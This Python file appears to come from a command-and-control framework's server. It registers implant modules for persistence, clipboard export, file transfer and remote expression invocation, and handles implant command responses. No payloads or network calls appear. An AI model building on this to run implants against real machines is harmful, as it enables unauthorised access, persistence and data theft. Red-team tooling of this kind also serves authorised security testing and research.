import ast

from Implant.implant_core.download_file import DownloadFile
from Implant.implant_core.upload_file import UploadFile
from Implant.implant_core.play_audio import PlayAudio
from Implant.implant_core.enable_persistence import EnablePersistence
from Implant.implant_core.export_clipboard import ExportClipboard
from Implant.implant_core.system_info import SystemInfo
from Implant.implant_core.load_module import LoadModule
from Implant.implant_core.invoke_expression import InvokeExpression
from Implant.implant_core.get_loaded_modules import GetLoadedModules

from Data.Database import Database


class ImplantFunctionality:
    def __init__(self):
        # get the modules from implant_core
        self.module_list = []
        self.module_list.append(DownloadFile())
        self.module_list.append(UploadFile())
        self.module_list.append(PlayAudio())            # Early PoC
        self.module_list.append(EnablePersistence())
        self.module_list.append(ExportClipboard())
        self.module_list.append(SystemInfo())
        self.module_list.append(LoadModule())
        self.module_list.append(InvokeExpression())
        self.module_list.append(GetLoadedModules())

    def get_list_of_implant_text(self):
        implant_text = []
        for module in self.module_list:
            implant_text.append(module.implant_text())
        return implant_text

    def command_listing(self):
        command_list = []
        for module in self.module_list:
            command_list.append({"type": module.type,
                                 "args": module.args,
                                 "input": module.input
                                 })
        return command_list

    def _get_module_object_by_type_(self, type_str):

        for implant_module in self.module_list:
            if implant_module.type == type_str:
                return implant_module

    def process_command_response(self, command_entry, raw_command_result):
        # Takes a module type value, and the result and passes the raw result to the module process_implant_response
        db = Database()
        a = db.implant.get_registered_implant_commands_by_command_id(command_entry)
        command_entry = ast.literal_eval(a['log_entry'])
        host_data = None
        response_string = raw_command_result

        implant_module= self._get_module_object_by_type_(command_entry['type'])
        if implant_module is not None:
            response_string, host_data = implant_module.process_implant_response(
                raw_command_result, command_entry['args'])

        # failure checks required.
        return response_string, host_data
